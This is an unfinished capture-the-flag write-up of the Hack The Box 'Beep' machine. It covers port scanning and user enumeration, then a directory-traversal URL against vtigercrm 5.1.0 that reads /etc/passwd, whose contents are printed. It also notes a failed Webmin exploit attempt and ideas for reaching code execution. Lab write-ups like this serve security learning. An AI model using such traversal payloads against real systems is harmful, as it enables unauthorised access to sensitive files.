# Beep
`still in progress`
## Recon

Tags for [this box](https://app.hackthebox.com/machines/5):  
> - LFI
> - Web 

Difficulty:
> Easy

### Scan findings
```nmap
PORT      STATE SERVICE    REASON         VERSION
22/tcp    open  ssh        syn-ack ttl 63 OpenSSH 4.3 (protocol 2.0)
25/tcp    open  smtp       syn-ack ttl 63 Postfix smtpd
|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN
80/tcp    open  http       syn-ack ttl 63 Apache httpd 2.2.3
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Did not follow redirect to https://10.10.10.7/
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
110/tcp   open  pop3       syn-ack ttl 63 Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
111/tcp   open  rpcbind    syn-ack ttl 63 2 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            875/udp   status
|_  100024  1            878/tcp   status
143/tcp   open  imap       syn-ack ttl 63 Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_imap-capabilities: NAMESPACE THREAD=ORDEREDSUBJECT LIST-SUBSCRIBED URLAUTHA0001 LISTEXT OK X-NETSCAPE IDLE RENAME CATENATE CONDSTORE MULTIAPPEND THREAD=REFERENCES ANNOTATEMORE Completed SORT=MODSEQ SORT IMAP4rev1 ATOMIC NO QUOTA BINARY LITERAL+ ACL CHILDREN ID IMAP4 STARTTLS MAILBOX-REFERRALS UNSELECT UIDPLUS RIGHTS=kxte
443/tcp   open  ssl/http   syn-ack ttl 63 Apache httpd 2.2.3 ((CentOS))
|_http-server-header: Apache/2.2.3 (CentOS)
| http-robots.txt: 1 disallowed entry
|_/
878/tcp   open  status     syn-ack ttl 63 1 (RPC #100024)
993/tcp   open  ssl/imap   syn-ack ttl 63 Cyrus imapd
995/tcp   open  pop3       syn-ack ttl 63 Cyrus pop3d
3306/tcp  open  mysql      syn-ack ttl 63 MySQL (unauthorized)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
4190/tcp  open  sieve      syn-ack ttl 63 Cyrus timsieved 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 (included w/cyrus imap)
4445/tcp  open  upnotifyp? syn-ack ttl 63
4559/tcp  open  hylafax    syn-ack ttl 63 HylaFAX 4.3.10
5038/tcp  open  asterisk   syn-ack ttl 63 Asterisk Call Manager 1.1
10000/tcp open  http       syn-ack ttl 63 MiniServ 1.570 (Webmin httpd)
|_http-trane-info: Problem with XML parsing of /evox/about
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Aggressive OS guesses: Linux 2.6.9 - 2.6.24 (95%),
```

Some users found on port 25
```
[25][smtp-enum] host: 10.10.10.7   login: info  
[25][smtp-enum] host: 10.10.10.7   login: adm  
[25][smtp-enum] host: 10.10.10.7   login: root  
[25][smtp-enum] host: 10.10.10.7   login: mysql  
[25][smtp-enum] host: 10.10.10.7   login: ftp
```

https webserver has a few webpages
```
200        1l        6w      894c https://10.10.10.7/favicon.ico  
200        2l        4w       28c https://10.10.10.7/robots.txt  
200       35l      111w     1785c https://10.10.10.7/  
200       35l      111w     1785c https://10.10.10.7/config.php  
200       35l      111w     1785c https://10.10.10.7/index.php  
200       35l      111w     1785c https://10.10.10.7/register.php
```

## Enumeration

The site on 443 is an Elastics CRM login page.  
![[Pasted image 20220113213548.png]]

## Exploitation

It might be this, considering the LFI tag.  
![[Pasted image 20220113212032.png]]

That exploit doesn't work, however it does help to enumerate vtigercrm. I checked, and sure enough it's on this box. The login page even discloses the version `5.1.0`

![[Pasted image 20220113213050.png]]

This new exploit [EDB-18770](https://www.exploit-db.com/exploits/18770), suggests the following url: `https://localhost/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../../etc/passwd%00`

Sure enough, I can read files now.

![[Pasted image 20220113213426.png]]

After some testing, it looks like we only need to go up 4 directories in the directory traversal: `/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../etc/passwd%00`

Contents of `/etc/passwd`
```bash
root:x:0:0:root:/root:/bin/bash
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash
cyrus:x:76:12:Cyrus IMAP Server:/var/lib/imap:/bin/bash
asterisk:x:100:101:Asterisk VoIP PBX:/var/lib/asterisk:/bin/bash
fanis:x:501:501::/home/fanis:/bin/bash
```

I was able to get the user flag using LFI

![[Pasted image 20220113215313.png]]

## more Enumeration

There is also a webserver on port 10000.  
![[Pasted image 20220114211041.png]]

An nmap script picked up `CVE-2006-3392`  
![[Pasted image 20220114213707.png]]  
This CVE is linked to [EDB-1997](http://www.exploit-db.com/exploits/1997/).  

Reviewing the exploit shows usage on line 50. No changes are necessary; all variables are provided at runtime instead of hardcoded in varaibles.  
![[Pasted image 20220114214954.png]]

This exploit is throwing errors:  
![[Pasted image 20220114215506.png]]

I found [this answer on StackOverflow](https://stackoverflow.com/a/6382581).  
![[Pasted image 20220114215646.png]]  
Installing the proper version for my php package.  

To identify php version:
```bash
php --version
```
Then install proper version:
```bash
sudo apt install php7.4-curl
```

![[Pasted image 20220114215957.png]]

It appears this exploit is not working even with php-curl installed.

There are a bunch of SSL errors in the NMAP output. It seems Autorecon was scanning using HTTP instead of HTTPS. Will re-run some scans with https.

These commands should be re-run using HTTPS instead of HTTP.
```
curl -sSik https://10.10.10.7:10000/ &&
curl -sSikf https://10.10.10.7:10000/.well-known/security.txt &&
curl -sSikf https://10.10.10.7:10000/robots.txt &&

nmap -vv --reason -Pn -T4 -sV -p 10000 --script="banner,(https* or ssl*) and not (brute or broadcast or dos or external or https-slowloris* or fuzzer)" -oN "/home/nate/hackthebox/beep/scans/tcp10000/tcp_10000_https_nmap.txt" -oX "/home/nate/hackthebox/beep/scans/tcp10000/xml/tcp_10000_https_nmap.xml" 10.10.10.7 &&

whatweb --color=never --no-errors -a 3 -v https://10.10.10.7:10000 2>&1
```

```bash
feroxbuster -u https://10.10.10.7:10000/ -t 10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x "php,bin,txt" -v -k -n -o /home/nate/hackthebox/beep/scans/tcp80/tcp_80_http_feroxbuster_https.txt
```



## Gotta get a shell.

I have the user flag, but I still don't have code execution. I need to examine the options and decide which route(s) to take.

### Brainstorming: LFI to RCE
- Poison logs
- Maybe RFI?
- 

